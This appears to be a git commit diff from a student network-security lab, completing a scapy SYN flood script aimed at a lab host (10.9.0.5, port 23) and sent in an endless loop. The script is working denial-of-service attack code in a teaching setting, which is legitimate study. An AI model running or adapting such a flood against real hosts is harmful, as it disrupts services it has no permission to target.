37f0a89631d0dda9ab0e574a360dc16fa12b46ab
Francesco Freda <fifreda@hotmail.it>
2022-10-19 08:45:15 +0200

    group work ch2

--- TCP Spoofing-20221017/Labsetup/volumes/synflood_draft.py
+++ TCP Spoofing-20221017/Labsetup/volumes/synflood_draft.py
@@ -4,8 +4,8 @@ from scapy.all import IP, TCP, send
 from ipaddress import IPv4Address
 from random import getrandbits
 
-ip = IP(dst="*.*.*.*")
-tcp = TCP(dport=**, flags='S')   # TO BE COMPLETED
+ip = IP(dst="10.9.0.5")
+tcp = TCP(dport=23, flags='S')   # TO BE COMPLETED
 pkt = ip/tcp
 
 while True:
